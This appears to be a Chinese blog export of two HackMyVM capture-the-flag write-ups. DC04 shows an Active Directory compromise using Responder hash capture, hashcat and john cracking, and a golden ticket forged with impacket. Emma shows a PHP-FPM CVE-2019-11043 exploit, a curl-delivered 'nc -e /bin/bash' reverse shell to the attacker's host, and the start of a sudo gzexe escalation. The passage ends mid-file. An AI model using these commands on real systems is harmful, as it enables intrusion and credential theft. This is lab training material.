Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 23:13 (0:00:00 remaining)
Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 23:13 (0:00:00 remaining)
Nmap scan report for 192.168.69.4
Host is up (0.00027s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://soupedecode.local
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-05 07:13:38Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
MAC Address: 08:00:27:13:99:85 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 15h59m57s
| smb2-time:
|   date: 2024-12-05T07:13:38
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:13:99:85 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.93 seconds

<br>配置hsots<br>
192.168.56.126 soupedecode.local DC01.soupedecode.local<br><br>[01:20:17] 200 -   10KB - /server-status/
[01:20:17] 200 -   10KB - /server-status
[01:20:18] 200 -  100KB - /server-info
<br>用dirsearch可以扫出来三个路径<br>
访问后里面可以找到一个子域名 heartbeat.soupedecode.local 添加到hosts里面<br>
<img alt="Pasted image 20241218142827" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241218142827.png" referrerpolicy="no-referrer"><br><br>访问后可以发现是一个登录框<br>
<img alt="Pasted image 20241218142949" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241218142949.png" referrerpolicy="no-referrer"><br>利用burp进行爆破一下<br>
这个机子很垃圾，爆破了几下就出问题了。后面怎么都爆破都是403了。重启也没有用，只能重新安装了<br>
建议还是启动了就保存一下快照
<br>最后报出来账号密码是 admin:nimda<br>
登录成功后会要求你输入ip地址<br>
<img alt="Pasted image 20241218152420" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241218152420.png" referrerpolicy="no-referrer"><br><br><br>输入我们kali的ip然后进行监听<br>
可以获取到一个NTLMhash<br>┌──(root㉿kali)-[/home]
└─# responder -I eth1
[SMB] NTLMv2-SSP Client   : 192.168.56.126
[SMB] NTLMv2-SSP Username : soupedecode\websvc
[SMB] NTLMv2-SSP Hash     : websvc::soupedecode:3d80cf0d5de8656a:911B4595F70D957A0671068267CDF165:010100000000000000F21251F450DB01006098D655A71BC1000000000200080054004E0039004B0001001E00570049004E002D0032003200470032004D003200310036004B004100340004003400570049004E002D0032003200470032004D003200310036004B00410034002E0054004E0039004B002E004C004F00430041004C000300140054004E0039004B002E004C004F00430041004C000500140054004E0039004B002E004C004F00430041004C000700080000F21251F450DB01060004000200000008003000300000000000000000000000004000007EB2E40733876D4CE24083BC1F55F4CD7B7D843B3B343F98128E45BD39583DFF0A001000000000000000000000000000000000000900220063006900660073002F003100390032002E003100360038002E00350036002E0035000000000000000000


<br>破解hash<br>hashcat hash.txt rockyou.txt

WEBSVC::soupedecode:3d80cf0d5de8656a:911b4595f70d957a0671068267cdf165:010100000000000000f21251f450db01006098d655a71bc1000000000200080054004e0039004b0001001e00570049004e002d0032003200470032004d003200310036004b004100340004003400570049004e002d0032003200470032004d003200310036004b00410034002e0054004e0039004b002e004c004f00430041004c000300140054004e0039004b002e004c004f00430041004c000500140054004e0039004b002e004c004f00430041004c000700080000f21251f450db01060004000200000008003000300000000000000000000000004000007eb2e40733876d4ce24083bc1f55f4cd7b7d843b3b343f98128e45bd39583dff0a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e00350036002e0035000000000000000000:jordan23

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: WEBSVC::soupedecode:3d80cf0d5de8656a:911b4595f70d95...000000
Time.Started.....: Wed Dec 18 02:39:31 2024 (0 secs)
Time.Estimated...: Wed Dec 18 02:39:31 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: jordan23 [8]
Guess.Queue......: 350/14336793 (0.00%)
Speed.#1.........:     4949 H/s (0.00ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1/1 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: jordan23 -&gt; jordan23
Hardware.Mon.#1..: Util: 16%

Started: Wed Dec 18 02:38:56 2024
Stopped: Wed Dec 18 02:39:32 2024

<br>获取到一对账号密码 WEBSVC ：jordan23 <br><br>┌──(root㉿kali)-[~/Desktop/hmv/dc04]
└─# crackmapexec smb 192.168.56.126 -u websvc -p jordan23 --shares

SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\websvc:jordan23 STATUS_PASSWORD_EXPIRED

<br>
密码是对的 只是过期了。 上Vbox更新一下密码即可
<br>我这里修改后的密码是 admin!@#45<br>
重新检测一下<br>┌──(root㉿kali)-[~/Desktop/hmv/dc04]
└─# crackmapexec smb 192.168.56.126 -u websvc -p 'admin!@#45' --shares

SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [+] SOUPEDECODE.LOCAL\websvc:admin!@#45
SMB         192.168.56.126  445    DC01             [+] Enumerated shares
SMB         192.168.56.126  445    DC01             Share           Permissions     Remark
SMB         192.168.56.126  445    DC01             -----           -----------     ------
SMB         192.168.56.126  445    DC01             ADMIN$                          Remote Admin
SMB         192.168.56.126  445    DC01             C               READ
SMB         192.168.56.126  445    DC01             C$                              Default share
SMB         192.168.56.126  445    DC01             IPC$            READ            Remote IPC
SMB         192.168.56.126  445    DC01             NETLOGON        READ            Logon server share
SMB         192.168.56.126  445    DC01             SYSVOL          READ            Logon server share

<br>在 websvc 用户下可以获取到userflag<br>┌──(root㉿kali)-[~/Desktop/hmv/dc04]
└─# cat user.txt
709e449a996a85aa7deaf18c79515d6a  
<br>而且也可以发现一些用户的目录<br>smb: \users\&gt; ls
  .                                  DR        0  Wed Nov  6 20:55:53 2024
  ..                                DHS        0  Tue Nov  5 18:30:29 2024
  Administrator                       D        0  Sat Jun 15 15:56:40 2024
  All Users                       DHSrn        0  Sat May  8 04:26:16 2021
  Default                           DHR        0  Sat Jun 15 22:51:08 2024
  Default User                    DHSrn        0  Sat May  8 04:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 04:14:03 2021
  fjudy998                            D        0  Wed Nov  6 20:55:33 2024
  ojake987                            D        0  Wed Nov  6 20:55:16 2024
  Public                             DR        0  Sat Jun 15 13:54:32 2024
  rtina979                            D        0  Wed Nov  6 20:54:39 2024
  websvc                              D        0  Wed Nov  6 20:44:11 2024
  xursula991                          D        0  Wed Nov  6 20:55:28 2024

<br>这里面的用户我们需要着重关注。<br>rtina979
xursula991
fjudy998
<br><br><br>┌──(root㉿kali)-[~/Desktop/hmv/dc04]
└─# rpcclient -U websvc%'admin!@#45' 192.168.56.126 -c "querydispinfo" |grep -E  'rtina979|xursula991|fjudy998'
index: 0x1330 RID: 0x80e acb: 0x00020010 Account: fjudy998      Name: Felix Judy        Desc: Music lover and aspiring guitarist
index: 0x131f RID: 0x7fd acb: 0x00020010 Account: rtina979      Name: Reed Tina Desc: Default Password Z~l3JhcV#7Q-1#M
index: 0x1329 RID: 0x807 acb: 0x00020010 Account: xursula991    Name: Ximena Ursula     Desc: Yoga practitioner and meditation lover

<br>获取到了 rtina979 用户的默认密码 Z~l3JhcV#7Q-1#M<br>检测一下是否可以使用<br>┌──(root㉿kali)-[~/Desktop/hmv/dc04]
└─# crackmapexec smb 192.168.56.126 -u rtina979 -p 'Z~l3JhcV#7Q-1#M'
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\rtina979:Z~l3JhcV#7Q-1#M STATUS_PASSWORD_EXPIRED

<br>可以使用。密码过期了 上Vbox修改一下即可<br>
这里我修改新密码为 c1trus123<br>┌──(root㉿kali)-[~/Desktop/hmv/dc04]
└─# crackmapexec smb 192.168.56.126 -u rtina979 -p 'c1trus123'
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [+] SOUPEDECODE.LOCAL\rtina979:c1trus123
<br>┌──(root㉿kali)-[~/Desktop/hmv/dc04]
└─# smbmap -H 192.168.56.126 -u rtina979 -p c1trus123

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 192.168.56.126:445      Name: soupedecode.local         Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C                                                       READ ONLY
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
[*] Closed 1 connections


<br>在 rtina979 用户的 Documents 目录下可以获取到一个文件 Report.rar<br>smb: \users\rtina979\Documents\&gt; ls
  .                                  DR        0  Thu Nov  7 17:35:52 2024
  ..                                  D        0  Wed Nov  6 20:54:39 2024
  My Music                        DHSrn        0  Wed Nov  6 20:54:39 2024
  My Pictures                     DHSrn        0  Wed Nov  6 20:54:39 2024
  My Videos                       DHSrn        0  Wed Nov  6 20:54:39 2024
  Report.rar                          A   712046  Thu Nov  7 08:35:49 2024

                12942591 blocks of size 4096. 11014117 blocks available
smb: \users\rtina979\Documents\&gt; get Report.rar
getting file \users\rtina979\Documents\Report.rar of size 712046 as Report.rar (11589.3 KiloBytes/sec) (average 11589.3 KiloBytes/sec)

<br><br>此压缩包杯加密了 爆破一下<br>┌──(root㉿kali)-[~/Desktop/hmv/dc04]
└─#  rar2john Report.rar
Created directory: /root/.john
Report.rar:$rar5$16$7b74f4c32feb807c16edc906c283e524$15$872f8d1a914bd1503dac110c7bbb938a$8$3e15430028d503b5

┌──(root㉿kali)-[~/Desktop/hmv/dc04]
└─#  rar2john Report.rar &gt;hash.txt

┌──(root㉿kali)-[~/Desktop/hmv/dc04]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (RAR5 [PBKDF2-SHA256 128/128 AVX 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
PASSWORD123      (Report.rar)
1g 0:00:00:33 DONE (2024-12-19 02:26) 0.02944g/s 1515p/s 1515c/s 1515C/s ang123..2pac4ever
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

<br>成功爆破出密码 PASSWORD123<br><br>解压后是一个渗透测试报告<br>
在报告的最后可以获取到 krbtgt 的hash<br>
<img alt="Pasted image 20241219154237" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219154237.png" referrerpolicy="no-referrer"><br><br>
黄金票证是一种权限维持手段，攻击者获得了对Active Directory密钥分发服务帐户KRBTGT的控制权，并使用该帐户伪造有效的Kerberos票证授予票证TGT。这使攻击者能够访问Active Directory域上的任何资源，如果有KRBTGT哈希，您可以伪造自己的TGT，其中包括想要的任何组成员身份的PAC数据。
<br><br>
<br>获取域中krbtgt用户使用的加密密钥 （这里已经获取到了krbtgt用户的NTLM hash）
<br>目标域名 域SID
<br>我们现在获取到了KRBTGT哈希 先验证一下是否是正确的<br>┌──(root㉿kali)-[~/Desktop/hmv/dc04]
└─# crackmapexec smb 192.168.56.126 -u krbtgt -H '0f55cdc40bd8f5814587f7e6b2f85e6f'
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\krbtgt:0f55cdc40bd8f5814587f7e6b2f85e6f STATUS_ACCOUNT_DISABLED

<br>很好是正确的<br><br>┌──(root㉿kali)-[~/Desktop/hmv/dc04]
└─# impacket-lookupsid soupedecode.local/rtina979:c1trus123@192.168.56.126 |grep SID
[*] Brute forcing SIDs at 192.168.56.126
[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164

<br><br>┌──(root㉿kali)-[~/Desktop/hmv/dc04]
└─# rdate -n 192.168.56.126
Thu Dec 19 19:05:54 EST 2024

<br><br>┌──(root㉿kali)-[~/Desktop/hmv/dc04]
└─# impacket-ticketer -nthash 0f55cdc40bd8f5814587f7e6b2f85e6f -domain-sid S-1-5-21-2986980474-46765180-2505414164 -domain soupedecode.local  administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
/usr/share/doc/python3-impacket/examples/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  aTime = timegm(datetime.datetime.utcnow().timetuple())
[*] Customizing ticket for soupedecode.local/administrator
/usr/share/doc/python3-impacket/examples/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))
/usr/share/doc/python3-impacket/examples/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
/usr/share/doc/python3-impacket/examples/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
/usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in administrator.ccache

<br><br>export KRB5CCNAME=administrator.ccache
<br><br>┌──(root㉿kali)-[~/Desktop/hmv/dc04]
└─# impacket-wmiexec soupedecode.local/administrator@dc01.soupedecode.local -k -target-ip 192.168.56.126
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] SMBv3.0 dialect used

[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\&gt;
C:\&gt;id
'id' is not recognized as an internal or external command,
operable program or batch file.

C:\&gt;whoami
soupedecode.local\administrator


C:\users\administrator\desktop&gt;type root.txt
1c66eabe105636d7e0b82ec1fa87cb7a

]]></description><link>https://www.c1trus.top/24-渗透/hmv/38.dc04.html</link><guid isPermaLink="false">24-渗透/HMV/38.DC04.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241218142827.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241218142827.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[37.emma]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. ️信息收集" data-href="#2. ️信息收集" href="https://www.c1trus.top/about:blank#2._️信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. ️信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. phpinfo漏洞利用" data-href="#3. phpinfo漏洞利用" href="https://www.c1trus.top/about:blank#3._phpinfo漏洞利用" class="internal-link" target="_self" rel="noopener nofollow">3. phpinfo漏洞利用</a>
<br><a data-tooltip-position="top" aria-label="4. www-data提权emma" data-href="#4. www-data提权emma" href="https://www.c1trus.top/about:blank#4._www-data提权emma" class="internal-link" target="_self" rel="noopener nofollow">4. www-data提权emma</a>
<br><a data-tooltip-position="top" aria-label="5. emma提权root" data-href="#5. emma提权root" href="https://www.c1trus.top/about:blank#5._emma提权root" class="internal-link" target="_self" rel="noopener nofollow">5. emma提权root</a><br>
- <a data-tooltip-position="top" aria-label="5.1. gzexe利用 劫持zip" data-href="#5.1. gzexe利用 劫持zip" href="https://www.c1trus.top/about:blank#5.1._gzexe利用_劫持zip" class="internal-link" target="_self" rel="noopener nofollow">5.1. gzexe利用 劫持zip</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Emma" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Emma</a><br>
作者  Emma<br>
难度 ⭐️⭐️⭐️⭐️
<br><br>┌──(root㉿kali)-[/home/kali/hmv/emma]
└─# nmap -sCV 192.168.200.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 12:02 CST
Nmap scan report for chimichurri.thl (192.168.200.4)
Host is up (0.000090s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:4c:af:92:cc:bb:99:59:d7:2f:1b:99:fb:f1:7c:f0 (RSA)
|   256 ba:0d:85:69:43:86:c1:91:7c:db:2a:1e:34:ab:68:1e (ECDSA)
|_  256 a1:ac:2c:ce:f4:07:da:96:12:74:d1:54:9e:f7:09:04 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn''t have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:64:B9:B4 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds

┌──(root㉿kali)-[/home/kali/hmv/emma]
└─# nmap 192.168.200.4 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 12:02 CST
Nmap scan report for chimichurri.thl (192.168.200.4)
Host is up (0.00030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:64:B9:B4 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.65 seconds

<br>首页 <br>┌──(root㉿kali)-[/home/kali/hmv/emma]
└─# curl http://192.168.200.4

空的
<br>目录扫描<br>┌──(root㉿kali)-[/home/kali/hmv/emma]
└─# dirsearch -u http://192.168.200.4
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/emma/reports/http_192.168.200.4/_24-12-04_12-05-14.txt

Target: http://192.168.200.4/

[12:05:14] Starting:
[12:05:29] 200 -   58KB - /phpinfo.php
[12:05:31] 200 -   15B  - /robots.txt


┌──(root㉿kali)-[/home/kali/hmv/emma]
└─# curl http://192.168.200.4/robots.txt
itwasonlyakiss

<br>获取到一个关键字符串 itwasonlyakiss  可能是密码或者用户<br><br>给了我们Phpinfo.index<br>
猜测是要打一波cve<br>
看一下php的版本<br>
<img alt="Pasted image 20241204123101" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241204123101.png" referrerpolicy="no-referrer"><br>
版本为 7.1.33dev<br>找到一个rce的漏洞 <a data-tooltip-position="top" aria-label="../../20-网安/28-CVE复现/CVE-2019-11043" data-href="../../20-网安/28-CVE复现/CVE-2019-11043" href="https://www.c1trus.top/20-网安/28-cve复现/cve-2019-11043.html" class="internal-link" target="_self" rel="noopener nofollow">CVE-2019-11043</a><br>
<a rel="noopener nofollow" class="external-link" href="https://blog.csdn.net/qq_42133828/article/details/102868522" target="_blank">https://blog.csdn.net/qq_42133828/article/details/102868522</a><br>漏洞利用项目地址 github.com/neex/phuip-fpizdam<br>安装环境<br>apt-get install golang
go get github.com/neex/phuip-fpizdam
export PATH=$PATH:$(go env GOPATH)/bin
<br>漏洞梭哈<br>┌──(root㉿kali)-[/home/kali/hmv/emma]
└─# phuip-fpizdam http://192.168.42.43/index.php
2024/12/04 12:39:32 Base status code is 200
2024/12/04 12:39:32 Status code 502 for qsl=1765, adding as a candidate
2024/12/04 12:39:32 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
2024/12/04 12:39:32 Attack params found: --qsl 1755 --pisos 23 --skip-detect
2024/12/04 12:39:32 Trying to set "session.auto_start=0"...
2024/12/04 12:39:32 Detect() returned attack params: --qsl 1755 --pisos 23 --skip-detect &lt;-- REMEMBER THIS
2024/12/04 12:39:32 Performing attack using php.ini settings...
2024/12/04 12:39:33 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&amp;" to URLs
2024/12/04 12:39:33 Trying to cleanup /tmp/a...
2024/12/04 12:39:33 Done!

<br>反弹shell<br>urlencode('id;nc -e /bin/bash 192.168.42.39 1234 ')
┌──(root㉿kali)-[/home/kali/hmv/emma]
└─# curl http://192.168.42.115/index.php/?a=/bin/sh+-c+%27id%3Bnc%20-e%20%2Fbin%2Fbash%20192.168.42.39%201234%20%27

┌──(pwncat-env)─(root㉿kali)-[~]
└─# pwncat-cs -lp 1234
[12:41:29] Welcome to pwncat 🐈!                                                                       __main__.py:164
[12:50:54] received connection from 192.168.42.115:55396                                                    bind.py:84
[12:50:55] 192.168.42.115:55396: registered new host w/ db                                              manager.py:957
(local) pwncat$
(remote) www-data@emma:/var/www/html$ whoami
www-data
(remote) www-data@emma:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
(remote) www-data@emma:/var/www/html$

<br><br>(remote) www-data@emma:/var/www/html$ find / -perm /4000 2&gt;/dev/null
/home/emma/who
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/mount
<br>靶机内部开放了 3306 端口<br>
可以看一下数据库<br>
数据库密码就是robots.txt 里面的那个 itwasonlyakiss<br>remote) www-data@emma:/etc$ mysql -uroot -pitwasonlyakiss
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 13
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| users              |
+--------------------+
4 rows in set (0.012 sec)

MariaDB [(none)]&gt; use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [users]&gt; show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.000 sec)

MariaDB [users]&gt; select * from users;
+----+------+----------------------------------+
| id | user | pass                             |
+----+------+----------------------------------+
|  1 | emma | 5f4dcc3b5aa765d61d8327deb882cf80 |
+----+------+----------------------------------+
1 row in set (0.000 sec)

<br><img alt="Pasted image 20241204131238" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241204131238.png" referrerpolicy="no-referrer"><br><br>这里有一个坑。 这个emma的密码不是解密后的明文 就是这个Md5值<br>(remote) www-data@emma:/etc$ su emma
Password:  5f4dcc3b5aa765d61d8327deb882cf80
emma@emma:/etc$

emma@emma:~$ sh flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: emma

PWNED DATE: Wed 04 Dec 2024 12:16:48 AM EST

WHOAMI: uid=1000(emma) gid=1000(emma) groups=1000(emma),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

FLAG: youdontknowme

------------------------

<br>emma@emma:~$ cat who.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
void main(){
setuid(0);
setgid(0);
printf("Im \n");
system("/bin/id");
setuid(1000);
setgid(1000);
printf("But now Im \n");
system("/bin/id");
}

emma@emma:~$ ls -la
total 64
drwxr-xr-x 4 emma emma  4096 Dec  4 00:14 .
drwxr-xr-x 3 root root  4096 Feb  4  2021 ..
-rw-r--r-- 1 emma emma   220 Feb  4  2021 .bash_logout
-rw-r--r-- 1 emma emma  3526 Feb  4  2021 .bashrc
-rwx------ 1 emma emma  1920 Feb  4  2021 flag.sh
drwx------ 3 emma emma  4096 Dec  4 00:14 .gnupg
drwxr-xr-x 3 emma emma  4096 Feb  4  2021 .local
-rw-r--r-- 1 emma emma   807 Feb  4  2021 .profile
-rw------- 1 emma emma    14 Feb  4  2021 user.txt
-rwsr-s--- 1 root emma 16760 Feb  4  2021 who
-rw-r--r-- 1 emma emma   185 Feb  4  2021 who.c
-rw------- 1 emma emma    50 Feb  4  2021 .Xauthority

emma@emma:~$ sudo -l
Matching Defaults entries for emma on emma:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User emma may run the following commands on emma:
    (ALL : ALL) NOPASSWD: /usr/bin/gzexe

<br>我们可以用Root权限调用 gzexe 命令 <br><br>gzexe 实际上是一个脚本可以压缩一个可执行文件。而且这个被压缩后的文件名字不会被改变而且也可以被执行，执行被压缩后的可执行文件时 会调用gzip命令解压缩<br>
我们可以通过环境变量劫持 gzip 来提权<br>
但是要提权肯定是需要一个root的权限去执行 gzip，<br>只要A被 gzexe 压缩，那么执行 A 就会触发 gzip<br>
关键点在于我们找哪个A被 gzexe 压缩<br>要求A必须能被root权限执行<br>emma@emma:~$ cat who.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
void main(){
setuid(0);
setgid(0);
printf("Im \n");
system("/bin/id");
setuid(1000);
setgid(1000);
